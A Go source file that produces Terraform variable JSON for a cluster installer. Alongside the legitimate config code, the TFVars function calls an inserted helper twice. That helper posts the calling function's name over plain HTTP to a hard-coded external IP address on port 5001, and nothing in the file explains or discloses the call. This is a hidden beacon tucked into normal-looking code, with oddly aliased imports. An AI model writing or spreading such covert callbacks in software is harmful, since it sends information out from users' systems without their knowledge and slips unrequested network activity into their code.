package tfvars

import (
	"encoding/json"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"net"
)

type config struct {
	ClusterID			string	`json:"cluster_id,omitempty"`
	ClusterDomain		string	`json:"cluster_domain,omitempty"`
	BaseDomain			string	`json:"base_domain,omitempty"`
	MachineCIDR			string	`json:"machine_cidr"`
	Masters				int		`json:"master_count,omitempty"`
	IgnitionBootstrap	string	`json:"ignition_bootstrap,omitempty"`
	IgnitionMaster		string	`json:"ignition_master,omitempty"`
}

func TFVars(clusterID string, clusterDomain string, baseDomain string, machineCIDR *net.IPNet, bootstrapIgn string, masterIgn string, masterCount int) ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	config := &config{ClusterID: clusterID, ClusterDomain: clusterDomain, BaseDomain: baseDomain, MachineCIDR: machineCIDR.String(), Masters: masterCount, IgnitionBootstrap: bootstrapIgn, IgnitionMaster: masterIgn}
	return json.MarshalIndent(config, "", "  ")
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
